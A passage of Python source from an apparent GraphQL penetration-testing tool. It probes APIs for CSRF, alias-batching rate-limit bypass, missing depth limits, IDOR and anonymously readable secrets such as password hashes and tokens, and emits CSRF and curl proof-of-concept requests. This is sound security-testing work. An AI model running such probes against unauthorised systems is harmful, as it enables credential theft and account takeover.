        has_body = any(t.doc_in == "body" for t in ok)
        if not (has_url and has_body):
            return
        learned = self.active_transport
        prefer = (learned.url_doc_key
                  if learned and learned.doc_in in ("url", "both") else None)
        url_t = next((t for t in ok
                      if t.doc_in == "url" and t.url_doc_key == prefer),
                     None) or next(t for t in ok if t.doc_in == "url")
        body_t = next((t for t in ok
                       if t.doc_in == "body"
                       and learned and t.body_doc_key == learned.body_doc_key),
                      None) or next(t for t in ok if t.doc_in == "body")
        mirror = Transport(label="mirrored", method=body_t.method,
                           doc_in="both", url_doc_key=url_t.url_doc_key,
                           body_doc_key=body_t.body_doc_key,
                           body_kind=body_t.body_kind)
        body_doc = "{ gqlhuntBody: __typename }"
        url_doc = "{ gqlhuntUrl: __typename }"
        try:
            r = gql.post(body_doc, identity=identity, transport=mirror,
                         url_doc=url_doc)
        except Budget.Exhausted:
            return
        data = gql_data(r)
        if not isinstance(data, dict):
            return
        winner = ("the URL copy" if "gqlhuntUrl" in data else
                  ("the body copy" if "gqlhuntBody" in data else None))
        if not winner:
            return
        loser = ("the body copy" if winner == "the URL copy"
                 else "the URL copy")
        self.add(Finding(
            sev=MED,
            title=f"Two documents, one request: {winner} is the one executed",
            url=url,
            impact="The same request carries a document in the URL and "
                   "another in the body, and only one runs. Anything that "
                   "inspects the other - WAF, quota accounting, audit log - "
                   "is looking at a document that was never executed.",
            proof=[f"?{url_t.url_doc_key}= carried {url_doc}",
                   f"body.{body_t.body_doc_key} carried {body_doc}",
                   f"server answered: {json.dumps(data)[:120]}",
                   f"executed: {winner}; ignored: {loser}"],
            chain=f"put the benign document in {loser} and the real one in "
                  f"{winner} to slip past any inspection of "
                  f"{loser.replace('the ', '')}"))

    def test_incremental(self, gql, identity, url):
        """@defer / @stream: deferred fragments sometimes skip the checks
        applied to the main payload."""
        doc = "{ __typename ... @defer { __typename } }"
        try:
            r = gql.post(doc, identity=identity)
        except Budget.Exhausted:
            return
        body = r.body or ""
        ct = r.header("Content-Type", "").lower()
        errs = " ".join(gql_errors(r))
        if re.search(r"(?i)unknown directive|cannot query field|not supported",
                     errs):
            return
        incremental = ("multipart" in ct or "hasNext" in body
                       or '"incremental"' in body
                       or '"is_final"' in body)
        if not incremental:
            return
        flat = re.sub(r"\s+", " ", body)[:150]
        self.add(Finding(
            sev=LOW,
            title="Incremental delivery (@defer / @stream) supported",
            url=url,
            impact="Deferred fragments are resolved on a second pass. Where "
                   "authorization is applied to the initial payload only, "
                   "the deferred part comes back unfiltered.",
            proof=[f"Content-Type: {ct or 'n/a'}",
                   f"response: {flat}"],
            note="worth replaying every denied field inside a @defer "
                 "fragment, by hand"))


    # -- 4. analysis --------------------------------------------------------

    def analyse_schema(self, schema: Schema, url):
        n_types, n_obj, n_q, n_m = schema.stats()
        self.add(Finding(
            sev=INFO, title="Schema recovered",
            url=url,
            impact="The full attack surface of the API, as the server "
                   "describes it.",
            proof=[f"{n_types} types ({n_obj} objects)",
                   f"{n_q} root queries, {n_m} root mutations",
                   f"query: {schema.query_type}, "
                   f"mutation: {schema.mutation_type}, "
                   f"subscription: {schema.subscription_type}"]))

        # -- dangerous mutations --
        rows = []
        for f in schema.root_mutations():
            name = f.get("name") or ""
            args = ", ".join(f"{a.get('name')}: {type_ref(a.get('type'))}"
                             for a in (f.get("args") or [])
                             if isinstance(a, dict))
            if DESTRUCTIVE_RX.search(name):
                sev = CRIT
            elif PRIVILEGED_RX.search(name):
                sev = HIGH
            elif WRITE_RX.search(name):
                sev = MED
            else:
                sev = LOW
            rows.append((sev, name, args, type_ref(f.get("type"))))
        rows.sort(key=lambda r: (_SEV_ORDER[r[0]], r[1]))
        if rows:
            hot = [r for r in rows if r[0] in (CRIT, HIGH)]
            lines = [f"[{s}] {n}({a}): {t}" for s, n, a, t in rows]
            self.write(url, "mutations.txt", "\n".join(lines))
            if hot:
                self.add(Finding(
                    sev=hot[0][0],
                    title=f"{len(hot)} high-risk mutation(s) in the schema",
                    url=url,
                    impact="Mutations whose name and arguments say they "
                           "delete, grant, transfer or take over. Their mere "
                           "presence is not the bug - reachability is - but "
                           "this is where to look first.",
                    proof=[f"[{s}] {n}({a})" for s, n, a, _ in hot[:25]],
                    note="NOT executed. Full list in mutations.txt",
                    poc="NOT executed by gqlhunt. To test by hand:\n"
                        + "body   " + gql_body(
                            f"mutation {hot[0][1][:1].upper()}{hot[0][1][1:]}"
                            f" {{ {hot[0][1]}({hot[0][2]}) {{ __typename }} }}"
                            .replace("!", ""),
                            None, None)))

        # -- sensitive fields --
        sens = []
        roots = {schema.query_type, schema.mutation_type,
                 schema.subscription_type}
        for tname in sorted(schema.types):
            if tname.startswith("__") or tname in roots:
                continue
            t = schema.types[tname]
            if t.get("kind") not in ("OBJECT", "INTERFACE", "INPUT_OBJECT"):
                continue
            fields = (t.get("fields") or []) + (t.get("inputFields") or [])
            for f in fields:
                if not isinstance(f, dict):
                    continue
                fname = f.get("name") or ""
                ftype = base_type_name(f.get("type"))
                kind = classify_name(fname, ftype)
                if kind:
                    sens.append((tname, fname, type_ref(f.get("type")), kind))
        if sens:
            hot = [s for s in sens if s[3] == "secret"]
            weak = [s for s in sens if s[3] == "weak"]
            self.write(url, "sensitive-fields.txt",
                       "\n".join(f"{k}: {t}.{f}: {ty}" for t, f, ty, k in sens))
            if hot:
                self.add(Finding(
                    sev=HIGH,
                    title=f"{len(hot)} sensitive field(s) exposed in the schema",
                    url=url,
                    impact="The web client asks for three fields; the "
                           "resolver serves whatever you ask for. Each of "
                           "these is a field you can simply request.",
                    proof=[f"{t}.{f}: {ty}" for t, f, ty, _ in hot[:25]],
                    note=f"{len(weak)} lower-confidence and "
                         f"{len(sens) - len(hot) - len(weak)} PII-shaped "
                         f"field(s) in sensitive-fields.txt"))

        # -- nested paths to sensitive types --
        paths = self.nested_paths(schema, {t for t, f, ty, k in sens
                                           if k == "secret"})
        if paths:
            self.write(url, "nested-paths.txt", "\n".join(paths))
            self.add(Finding(
                sev=MED,
                title=f"{len(paths)} alternative path(s) to a sensitive type",
                url=url,
                impact="Authorization in GraphQL lives in each resolver. "
                       "These are the routes to the same object that do NOT "
                       "go through the obvious one, which is exactly where "
                       "the check is usually missing.",
                proof=paths[:15],
                note="full list in nested-paths.txt; replay each with and "
                     "without your session"))
        return rows, sens, paths

    def nested_paths(self, schema: Schema, hot_types, max_depth=4, limit=60):
        """BFS from each Query root field to any type holding a secret field."""
        if not hot_types:
            return []
        out = []
        for root in schema.root_queries():
            rname = root.get("name")
            rtype = base_type_name(root.get("type"))
            if not rtype:
                continue
            stack = [(rtype, [rname], 1)]
            seen = set()
            while stack and len(out) < limit:
                tname, path, depth = stack.pop()
                if depth > max_depth or (tname, depth) in seen:
                    continue
                seen.add((tname, depth))
                if tname in hot_types and len(path) > 1:
                    out.append(" -> ".join(path) + f"   [{tname}]")
                    continue
                for f in schema.fields_of(tname):
                    sub = base_type_name(f.get("type"))
                    if not sub or schema.is_leaf(sub):
                        continue
                    stack.append((sub, path + [f.get("name")], depth + 1))
        return out[:limit]

    # -- 5. proof-based tests (graphql-cop's list, upgraded) ----------------

    def test_battery(self, gql, identity, url, schema, engine):
        # -- field suggestions --
        if self.suggestions_enabled(gql, identity):
            self.add(Finding(
                sev=LOW, title="Field suggestions enabled",
                url=url,
                impact="The server names its own fields when you get one "
                       "slightly wrong. The schema can be reconstructed "
                       "without introspection.",
                proof=[f"one request leaked: "
                       f"{', '.join(getattr(self, '_free_names', [])[:12])}"],
                note="this is what makes schema recovery possible with "
                     "introspection disabled"))

        # -- GET accepted --
        r = gql.get("{__typename}", identity=identity)
        get_ok = isinstance(gql_data(r), dict)
        if get_ok:
            self.add(Finding(
                sev=LOW, title="Queries accepted over GET",
                url=url,
                impact="Operations end up in logs, proxies and Referer "
                       "headers, and the endpoint becomes cacheable.",
                proof=[f"GET ?query={{__typename}} -> "
                       f"{json.dumps(gql_data(r))[:80]}"]))

        if schema and schema.mutation_type is None:
            self.rep.info("schema exposes no Mutation root: the CSRF probes "
                          "are not applicable")
            csrf_ok = False
        else:
            csrf_ok = True

        # -- CSRF: a mutation over GET, proven without any side effect --
        r = gql.get("mutation{__typename}", identity=identity) if csrf_ok \
            else Response(error="skipped")
        verdict = self.mutation_accepted(r, schema) if csrf_ok else False
        how = "mutation{__typename}"
        if verdict is False:
            self.rep.info("mutation over GET was coerced to a query "
                          "(__typename came back as the Query root) - not "
                          "reported as CSRF")
        if verdict is None:
            # some filters block anything containing "__type"; a field that
            # does not exist reaches the validator and proves the same thing
            r = gql.get("mutation{zzzGqlHuntProbe}", identity=identity)
            verdict = self.mutation_accepted(r, schema)
            how = "mutation{<undefined field>} (reached validation)"
        if verdict:
            self.add(Finding(
                sev=HIGH, title="CSRF: mutations accepted over GET",
                url=url,
                impact="A mutation can be triggered by an <img> or a link, "
                       "with the victim's cookies and no preflight. Any "
                       "state-changing operation in the schema is reachable "
                       "from any website.",
                proof=[f"GET ?query={how} -> "
                       f"{(json.dumps(gql_data(r)) or '')[:70] if gql_data(r) else (gql_errors(r) or [''])[0][:90]}"],
                note="__typename was used deliberately: it is a valid "
                     "mutation operation that executes no resolver",
                poc=f"<img src=\"{url}?query=mutation%7B__typename%7D\">"))

        # -- CSRF: form-urlencoded --
        r = gql.post_form("mutation{__typename}", identity=identity) \
            if csrf_ok else Response(error="skipped")
        verdict = self.mutation_accepted(r, schema) if csrf_ok else False
        howf = "mutation{__typename}"
        if verdict is None:
            r = gql.post_form("mutation{zzzGqlHuntProbe}", identity=identity)
            verdict = self.mutation_accepted(r, schema)
            howf = "mutation{<undefined field>} (reached validation)"
        if verdict:
            self.add(Finding(
                sev=HIGH, title="CSRF: mutations accepted as "
                                "application/x-www-form-urlencoded",
                url=url,
                impact="A simple auto-submitting HTML form reaches the "
                       "endpoint with the victim's session - no CORS "
                       "preflight, no token.",
                proof=[f"POST (urlencoded) {howf} -> "
                       f"{(json.dumps(gql_data(r)) or '')[:70] if gql_data(r) else (gql_errors(r) or [''])[0][:90]}"],
                poc=f"<form action=\"{url}\" method=\"POST\">"
                    f"<input name=query value=\"mutation{{...}}\"></form>"))

        # -- array batching --
        r = gql.post_raw_json([{"query": "{__typename}"},
                               {"query": "{alias:__typename}"}],
                              identity=identity)
        obj = r.json()
        if isinstance(obj, list) and len(obj) >= 2:
            self.add(Finding(
                sev=MED, title="Array batching accepted",
                url=url,
                impact="Several independent operations per HTTP request. "
                       "Anything that counts requests - rate limiting, "
                       "throttling, WAF rules - counts wrong.",
                proof=[f"a 2-operation batch returned {len(obj)} results"],
                chain="stack authentication or OTP attempts in one request"))

        # -- alias overloading, measured --
        self.test_aliases(gql, identity, url, schema)

        # -- directive overloading --
        n = min(100, self.args.alias_count)
        doc = ("query " + " ".join(["@skip(if: false)"] * n)
               + " { __typename }")
        t0 = time.time()
        r = gql.post(doc, identity=identity)
        if isinstance(gql_data(r), dict):
            self.add(Finding(
                sev=LOW, title=f"Directive overloading accepted ({n} directives)",
                url=url,
                impact="No cap on repeated directives: the parser can be "
                       "made to do arbitrary work before execution.",
                proof=[f"{n} directives accepted in {(time.time()-t0)*1000:.0f} ms"],
                note="bounded deliberately; not amplified"))

        # -- depth limit --
        self.test_depth(gql, identity, url, schema)

        # -- transport surface, mirrored documents, incremental delivery --
        self.test_transport_surface(gql, identity, url, schema)
        self.test_incremental(gql, identity, url)

        # -- debug / trace / console --
        self.test_debug(gql, identity, url, engine)

    def test_aliases(self, gql, identity, url, schema):
        """
        Proof, not assumption: count the results AND compare timings against a
        single-alias baseline, so the report says how much work was amplified.
        """
        field = "__typename"
        free = None
        if schema:
            # a field with no required args that really runs a resolver;
            # a leaf is ideal, an object with { __typename } still resolves
            for f in schema.root_queries():
                if schema.required_args(f):
                    continue
                rt = base_type_name(f.get("type")) or ""
                if schema.is_leaf(rt):
                    free = f.get("name")
                    break
                if free is None:
                    free = f"{f.get('name')} {{ __typename }}"
        target = free or field
        n = self.args.alias_count
        base_doc = "{ b0: %s }" % target
        many_doc = "{ " + " ".join(f"a{i}: {target}" for i in range(n)) + " }"
        label = target.split(" ")[0]
        try:
            r1 = gql.post(base_doc, identity=identity)
            r2 = gql.post(many_doc, identity=identity)
        except Budget.Exhausted:
            return
        d1, d2 = gql_data(r1), gql_data(r2)
        if not isinstance(d2, dict):
            return
        got = len(d2)
        if got < n * 0.9:
            return
        t1 = max(r1.elapsed, 0.001)
        factor = r2.elapsed / t1
        measured = free is not None
        amplified = measured and factor >= 1.5
        self.add(Finding(
            sev=MED if amplified else LOW,
            title=f"Alias overloading accepted ({got} aliases in one request)",
            url=url,
            impact="One HTTP request performs N operations. Every control "
                   "that counts requests is bypassed by construction.",
            proof=[f"1 alias: {r1.elapsed*1000:.0f} ms",
                   f"{got} aliases: {r2.elapsed*1000:.0f} ms "
                   f"(x{factor:.1f})",
                   f"field used: {label}"
                   + ("" if measured else "  (__typename resolves to a "
                                          "constant, so this proves "
                                          "acceptance, not cost)")]
                  + ([] if amplified or not measured else
                     ["no amplification measured (caching, or the resolver "
                      "is cheap): the rate-limit bypass stands, the DoS "
                      "angle does not"]),
            chain="alias-batch a login / OTP / coupon mutation to brute force "
                  "it in a single request"))

    def test_depth(self, gql, identity, url, schema):
        """Look for the missing guard rail; do not ring it."""
        cyc = self.find_cycle(schema) if schema else None
        depths = [3, 6, 9, self.args.max_depth]
        best, timings = 0, []
        for d in sorted(set(x for x in depths if x <= self.args.max_depth)):
            if cyc:
                doc = self.cycle_doc(cyc, d)
            else:
                inner = "kind name"
                for _ in range(d):
                    inner = "kind name ofType { %s }" % inner
                doc = "{ __type(name: \"Query\") { %s } }" % inner
            try:
                r = gql.post(doc, identity=identity)
            except Budget.Exhausted:
                break
            if not r.ok:
                break
            msgs = " ".join(gql_errors(r)).lower()
            if any(k in msgs for k in ("depth", "complexity", "cost",
                                       "too large", "exceed")):
                self.rep.info(f"depth {d} refused: guard rail present")
                return
            if gql_data(r) is None:
                break
            best = d
            timings.append(f"depth {d}: {r.elapsed*1000:.0f} ms")
            if r.elapsed > 5:
                self.rep.info("stopping depth probe: response time climbing")
                break
        if best >= self.args.max_depth and cyc:
            self.add(Finding(
                sev=MED, title="No query depth or cost limit",
                url=url,
                impact="A cyclic path in the graph with no depth limit is a "
                       "denial of service: each level multiplies the work.",
                proof=timings + [f"cycle used: {' -> '.join(cyc[1])}"]
                      + ([] if len(timings) < 2 else
                         ["timings flat: no cost amplification observed, "
                          "only the missing limit"]),
                note=f"probe stopped at depth {best} on purpose - the missing "
                     f"guard rail is the finding, the outage is not",
                chain="nest the cycle to exhaust CPU / memory (NOT attempted)"))
        elif best >= self.args.max_depth:
            self.rep.info(f"no depth limit up to {best} (introspection path; "
                          f"no application cycle known)")

    def find_cycle(self, schema: Schema):
        """(root_field, [path]) for a Query root field that loops back."""
        if not schema:
            return None
        for root in schema.root_queries():
            rtype = base_type_name(root.get("type"))
            if not rtype or schema.is_leaf(rtype):
                continue
            for f in schema.fields_of(rtype):
                sub = base_type_name(f.get("type"))
                if not sub or schema.is_leaf(sub):
                    continue
                for g in schema.fields_of(sub):
                    if base_type_name(g.get("type")) == rtype:
                        return (root.get("name"),
                                [root.get("name"), f.get("name"),
                                 g.get("name")])
        return None

    def cycle_doc(self, cyc, depth):
        root, path = cyc
        inner = "__typename"
        for _ in range(depth):
            inner = f"{path[1]} {{ {path[2]} {{ {inner} }} }}"
        return "{ %s { %s } }" % (root, inner)

    def test_debug(self, gql, identity, url, engine):
        r = gql.post("{ __typename }", identity=identity)
        obj = r.json() or {}
        ext = obj.get("extensions") if isinstance(obj, dict) else None
        if isinstance(ext, dict) and ("tracing" in ext or "metrics" in ext):
            self.add(Finding(
                sev=LOW, title="Tracing / metrics extension enabled",
                url=url,
                impact="Per-resolver timings expose the internal structure "
                       "and help time-based attacks.",
                proof=[f"extensions keys: {', '.join(list(ext)[:8])}"]))

        r = gql.post("{ zzzGqlHuntProbe }", identity=identity)
        body = r.body or ""
        if re.search(r"(?i)(stacktrace|\"trace\"|at [\w.$]+\([\w.]+\.java:"
                     r"|File \"/|/usr/(local/)?lib/|node_modules/|"
                     r"debugMessage)", body):
            snippet = re.sub(r"\s+", " ", body)[:200]
            self.add(Finding(
                sev=MED, title="Debug mode: stack traces in error responses",
                url=url,
                impact="Absolute paths, framework versions and internal "
                       "class names - the reconnaissance is done for you.",
                proof=[snippet]))

        # exposed consoles
        p = urllib.parse.urlsplit(url)
        origin = f"{p.scheme}://{p.netloc}"
        for path in CONSOLE_PATHS:
            try:
                rr = gql._send("GET", None, None, identity,
                               url=origin + path, max_read=64 * 1024)
            except Budget.Exhausted:
                break
            if not rr.ok or rr.status != 200:
                continue
            b = rr.body or ""
            if re.search(r"(?i)(graphiql|graphql playground|altair|"
                         r"apollo (server|sandbox|studio)|voyager)", b) and \
                    "<html" in b.lower():
                self.add(Finding(
                    sev=LOW, title="GraphQL console exposed",
                    url=origin + path,
                    impact="An interactive client in production: schema "
                           "browsing and one-click operations for anyone.",
                    proof=[f"GET {path} -> HTML console, {len(b)} bytes"]))
                break


    # -- 5b. extraction: ask for the sensitive fields and print what comes back

    ARG_GUESS_ORDER = ["1", "2", "42"]
    ID_FIELDS = ("id", "uuid", "_id", "slug", "key", "identifier", "code",
                 "reference", "ref", "nid", "tid", "uid", "entityid")

    def remember_ids(self, node, depth=0):
        """
        Identifiers seen in a response are reusable: `allPodcasts { id }`
        hands you the value that makes `PodcastById(id: ...)` actually return
        something. Guessing "1" is what produces a PoC that answers null.
        """
        if depth > 6:
            return
        if isinstance(node, dict):
            for k, v in node.items():
                if isinstance(v, (dict, list)):
                    self.remember_ids(v, depth + 1)
                elif isinstance(v, (str, int)) and str(v) and \
                        k.lower() in self.ID_FIELDS:
                    val = str(v)
                    if 0 < len(val) <= 64 and val not in self.seen_ids:
                        self.seen_ids.append(val)
        elif isinstance(node, list):
            for item in node[:20]:
                self.remember_ids(item, depth + 1)

    def arg_literal(self, schema, arg):
        """A harmless literal for a required argument."""
        t = arg.get("type") or {}
        name = base_type_name(t) or ""
        kind = (schema.types.get(name) or {}).get("kind")
        if kind == "ENUM":
            vals = [v.get("name") for v in
                    (schema.types.get(name) or {}).get("enumValues") or []
                    if isinstance(v, dict)]
            return vals[0] if vals else None
        if name in ("Int", "Float"):
            return "1"
        if name == "Boolean":
            return "false"
        if name in ("ID", "String") or kind == "SCALAR":
            aname = (arg.get("name") or "").lower()
            if aname in self.ID_FIELDS and self.seen_ids:
                return json.dumps(self.seen_ids[0])
            return '"1"'
        return None      # input objects: not guessed, the field is skipped

    def arg_value(self, schema, arg):
        """The same guess as arg_literal, but as a JSON value."""
        lit = self.arg_literal(schema, arg)
        if lit is None:
            return None
        try:
            return json.loads(lit)
        except Exception:
            return lit

    def hot_fields(self, schema, tname, pii=True):
        out = []
        for f in schema.fields_of(tname):
            n = f.get("name") or ""
            if schema.required_args(f):
                continue
            kind = classify_name(n, base_type_name(f.get("type")))
            if kind == "secret":
                out.append((n, "secret"))
            elif kind == "weak":
                out.append((n, "weak"))
            elif pii and kind == "pii":
                out.append((n, "pii"))
        return out

    def probe_spec(self, schema, f):
        """
        (label, arg_values, selection, kinds) or None.

        Built at probe time, not up front, so that the identifiers harvested
        from the argument-less queries are already available here.
        """
        fname = f.get("name")
        rt = base_type_name(f.get("type"))
        if not rt or schema.is_leaf(rt):
            return None
        arg_values = {}
        for a in schema.required_args(f):
            val = self.arg_value(schema, a)
            if val is None:
                return None          # input object: not guessable, skip
            arg_values[a.get("name")] = val

        hot = self.hot_fields(schema, rt)
        if hot:
            ident_fields = [x.get("name") for x in schema.fields_of(rt)
                            if (x.get("name") or "").lower()
                            in ("id", "uuid", "username", "name", "login")][:2]
            sel = " ".join(dict.fromkeys(ident_fields + [h for h, _ in hot]))
            return fname, arg_values, "{ " + sel + " }", dict(hot)

        for x in schema.fields_of(rt):
            sub = base_type_name(x.get("type"))
            if not sub or schema.is_leaf(sub) or schema.required_args(x):
                continue
            subhot = self.hot_fields(schema, sub)
            if subhot:
                sel = " ".join(h for h, _ in subhot)
                return (f"{fname}.{x.get('name')}", arg_values,
                        "{ " + x.get("name") + " { " + sel + " } }",
                        dict(subhot))
        return None

    def harvest_sensitive(self, gql, url, identities, schema):
        """
        The difference between "the schema contains passwordHash" and a
        finding: request it, and print what the server returned.

        Two passes on purpose. The argument-less queries run first because
        they hand over real identifiers; the by-id queries run second and use
        them. `PodcastById(id: "1")` answers null and makes a useless PoC -
        `PodcastById(id: "HJr4dOVtuI")` is a report.
        """
        if not schema:
            return

        def value(f):
            rt = base_type_name(f.get("type")) or ""
            score = 0
            if self.type_is_hot(schema, rt):
                score -= 4
            if any(classify_name(x.get("name") or "",
                                 base_type_name(x.get("type"))) in
                   ("secret", "pii") for x in schema.fields_of(rt)):
                score -= 2
            n = (f.get("name") or "").lower()
            if any(k in n for k in ("user", "account", "consumer", "oauth",
                                    "token", "admin", "customer", "member",
                                    "credential", "session")):
                score -= 3
            return score

        roots = sorted(schema.root_queries(), key=value)
        first = [f for f in roots if not schema.required_args(f)]
        second = [f for f in roots if schema.required_args(f)]
        done = 0
        for wave, fields in (("no-argument", first), ("by-identifier", second)):
            for f in fields:
                if done >= self.args.max_probe_fields:
                    break
                spec = self.probe_spec(schema, f)
                if not spec:
                    continue
                done += 1
                try:
                    if self.run_probe(gql, url, identities, schema, f, spec,
                                      wave):
                        pass
                except Budget.Exhausted:
                    return

    def run_probe(self, gql, url, identities, schema, field, spec, wave):
        label, arg_values, selection, kinds = spec
        doc, variables, op_name = operation_form(schema, field, arg_values,
                                                 selection)
        for identity in identities:
            r = gql.post(doc, variables=variables, identity=identity,
                         op_name=op_name)
            data = gql_data(r)
            if not self.meaningful(data):
                continue
            self.remember_ids(data)
            hits = self.collect_values(data, kinds)
            if not hits:
                continue
            secret = any(kind == "secret" for _, _, kind in hits)
            weakonly = not secret and all(kind == "weak"
                                          for _, _, kind in hits)
            anon = identity.name == "anon"
            if anon:
                sev = CRIT if secret else (MED if weakonly else HIGH)
                title = (f"Secrets readable WITHOUT authentication via "
                         f"'{label}'" if secret else
                         (f"Low-confidence sensitive values readable "
                          f"without authentication via '{label}'"
                          if weakonly else
                          f"Personal data readable without authentication "
                          f"via '{label}'"))
            elif not secret:
                continue          # authenticated PII is not a finding
            else:
                sev = HIGH
                title = (f"Secret fields served to '{identity.name}' "
                         f"via '{label}'")
            block, curl, http, raw = build_poc(
                url, doc, variables, op_name,
                headers=None if anon else identity.headers,
                transport=self.active_transport)
            self.record_poc(url, title, curl, http, raw)
            self.add(Finding(
                sev=sev, title=title, url=url,
                impact=("These values were returned by the server, not "
                        "inferred from the schema. Password hashes, API "
                        "tokens and 2FA seeds are account takeover; the "
                        "rest is a data-protection incident."
                        if not weakonly else
                        "Returned by the server, but the field names only "
                        "loosely suggest sensitivity - judge the values "
                        "yourself before reporting."),
                proof=[f"{k} = {v}" + ("   [secret]" if kind == "secret"
                                       else "")
                       for k, v, kind in hits[:20]],
                note=("identifier reused from an earlier response, so this "
                      "request really resolves"
                      if wave == "by-identifier" and arg_values else ""),
                poc=block))
            self.write(url, f"extracted-{identity.name}.json",
                       json.dumps({"query": doc, "variables": variables,
                                   "data": data}, indent=2)[:200000])
            return True
        return False

    def record_simple_poc(self, url, title, doc, variables=None,
                          op_name=None, headers=None):
        block, curl, http, raw = build_poc(url, doc, variables, op_name,
                                           headers)
        self.record_poc(url, title, curl, http, raw)
        return block

    def record_poc(self, url, title, curl, http, raw):
        self.pocs.append((title, curl, http, raw))
        if not self.out_root:
            return
        d = self.outdir(url)
        if not d:
            return
        try:
            with open(os.path.join(d, "pocs.txt"), "a",
                      encoding="utf-8") as fh:
                fh.write(f"\n{'=' * 72}\n{title}\n{'=' * 72}\n\n"
                         f"--- request body (paste into Burp Repeater) ---\n"
                         f"{raw}\n\n"
                         f"--- curl ---\n{curl}\n\n"
                         f"--- raw HTTP request ---\n{http}\n")
        except Exception as e:
            self.rep.warn(f"cannot write pocs.txt: {e}")

    def collect_values(self, node, kinds, path="", out=None, depth=0):
        out = [] if out is None else out
        if depth > 6 or len(out) > 60:
            return out
        if isinstance(node, dict):
            for k, v in node.items():
                if isinstance(v, (dict, list)):
                    self.collect_values(v, kinds, f"{path}{k}.", out, depth + 1)
                elif v is not None and k in kinds:
                    out.append((f"{path}{k}", str(v)[:80], kinds[k]))
        elif isinstance(node, list):
            for item in node[:5]:
                self.collect_values(item, kinds, path, out, depth + 1)
        return out


    MUT_FIELD_RX = re.compile(
        r"(?i)cannot query field .{0,40} on type ['\"`]?(Mutation|mutation_root|"
        r"RootMutationType)")
    MUT_REFUSED_RX = re.compile(
        r"(?i)(can only perform a|only supports? query|mutation.{0,30}not "
        r"(allowed|supported).{0,30}(get|http)|get.{0,30}only.{0,20}quer)")

    def mutation_accepted(self, resp, schema=None):
        """
        True  - the server treated a mutation operation as executable here.
        False - it explicitly refused mutations over this transport.
        None  - inconclusive.

        Nothing is ever executed: either __typename (a valid mutation field
        that runs no resolver) or a field that does not exist, which only ever
        reaches the validator.
        """
        mut_names = {"Mutation", "mutation_root", "RootMutationType",
                     "Mutations"}
        qry_names = {"Query", "query_root", "RootQueryType"}
        if schema:
            if schema.mutation_type:
                mut_names.add(schema.mutation_type)
            if schema.query_type:
                qry_names.add(schema.query_type)
        data = gql_data(resp)
        if isinstance(data, dict):
            got = data.get("__typename")
            if got in mut_names:
                return True
            if got in qry_names:
                # the document said `mutation`, the server answered with the
                # QUERY root: it coerced the operation instead of running it.
                # Reporting CSRF here would be a false positive.
                return False
        msgs = " ".join(gql_errors(resp))
        if not msgs:
            return None
        if self.MUT_REFUSED_RX.search(msgs):
            return False
        if self.MUT_FIELD_RX.search(msgs):
            return True
        return None

    # -- 6. authorization differential --------------------------------------

    def authz_differential(self, gql, url, identities, schema):
        """
        The test nothing else automates: the same operation, several
        identities, and a diff. Read-only by construction.
        """
        auth = [i for i in identities if i.name != "anon"]
        if not auth:
            self.rep.info("no -r identity: skipping the authorization diff")
            return

        # (a) the captured operation, replayed as everyone else
        for owner in auth:
            if not owner.operation or not owner.operation.get("query"):
                continue
            q = owner.operation["query"]
            if re.match(r"\s*mutation", q) and not self.args.allow_mutations:
                self.rep.info(f"{owner.name}: captured operation is a "
                              f"mutation - not replayed (use "
                              f"--allow-mutations to opt in)")
                continue
            ref = gql.post(q, variables=owner.operation.get("variables"),
                           identity=owner,
                           op_name=owner.operation.get("operationName"))
            ref_data = gql_data(ref)
            if not ref_data or not self.meaningful(ref_data):
                self.rep.info(f"{owner.name}: captured operation returned "
                              f"nothing usable, skipping the diff")
                continue
            self.write(url, f"captured-{owner.name}.json",
                       json.dumps(ref.json(), indent=2)[:200000])

            for other in identities:
                if other is owner:
                    continue
                rr = gql.post(q, variables=owner.operation.get("variables"),
                              identity=other,
                              op_name=owner.operation.get("operationName"))
                od = gql_data(rr)
                if not od or not self.meaningful(od):
                    continue
                same = json.dumps(od, sort_keys=True) == \
                    json.dumps(ref_data, sort_keys=True)
                if not same:
                    continue
                if other.name == "anon":
                    self.add(Finding(
                        sev=CRIT,
                        title="Authenticated operation returns the same data "
                              "with NO session",
                        url=url,
                        impact="The operation captured from an authenticated "
                               "session returns byte-identical data when "
                               "replayed anonymously. The authorization check "
                               "does not exist.",
                        proof=[f"operation: {self.op_label(q)}",
                               f"identical response, {len(json.dumps(od))} bytes",
                               f"sample: {json.dumps(od)[:160]}"],
                        poc=build_poc(url, q,
                                  owner.operation.get("variables"),
                                  owner.operation.get("operationName"),
                                  transport=self.active_transport)[0]))
                else:
                    self.add(Finding(
                        sev=CRIT,
                        title=f"Cross-account read: {other.name} sees "
                              f"{owner.name}'s data",
                        url=url,
                        impact="The exact operation of one account, replayed "
                               "with a second account's session, returns the "
                               "first account's data. This is an IDOR with "
                               "both sides proven.",
                        proof=[f"operation: {self.op_label(q)}",
                               f"{owner.name} and {other.name} both received "
                               f"the same {len(json.dumps(od))} bytes",
                               f"sample: {json.dumps(od)[:160]}"],
                        note="both identities came from your own request "
                             "files, so the comparison is exact",
                        poc=build_poc(url, q,
                                      owner.operation.get("variables"),
                                      owner.operation.get("operationName"),
                                      headers=other.headers,
                                      transport=self.active_transport)[0]))

        # (b) schema-driven: sensitive root queries, authenticated vs anon
        if not schema:
            return
        anon = next((i for i in identities if i.name == "anon"), ANON)
        owner = auth[0]
        checked = 0
        for f in schema.root_queries():
            if checked >= self.args.max_probe_fields:
                break
            name = f.get("name") or ""
            if schema.required_args(f):
                continue
            rtype = base_type_name(f.get("type")) or ""
            interesting = classify_name(name) or \
                name.lower() in ("me", "viewer", "currentuser", "whoami",
                                 "users", "user", "accounts", "account",
                                 "admin", "orders", "invoices", "payments") or \
                self.type_is_hot(schema, rtype)
            if not interesting:
                continue
            doc = self.build_query(schema, f)
            if not doc:
                continue
            checked += 1
            try:
                ra = gql.post(doc, identity=anon)
                ru = gql.post(doc, identity=owner)
            except Budget.Exhausted:
                break
            da, du = gql_data(ra), gql_data(ru)
            if not self.meaningful(da):
                continue
            if du is not None and json.dumps(da, sort_keys=True) == \
                    json.dumps(du, sort_keys=True):
                sev = HIGH if self.type_is_hot(schema, rtype) else MED
                self.add(Finding(
                    sev=sev,
                    title=f"Root query '{name}' served without authentication",
                    url=url,
                    impact="Returns the same data with and without a "
                           "session, on a type that carries sensitive "
                           "fields.",
                    proof=[f"query: {doc[:160]}",
                           f"anonymous response: {json.dumps(da)[:200]}"],
                    poc=build_poc(url, doc,
                                  transport=self.active_transport)[0]))
            elif self.meaningful(da) and du is None:
                self.rep.info(f"{name}: anon works, authenticated failed "
                              f"(odd, worth a look by hand)")

    @staticmethod
    def op_label(q):
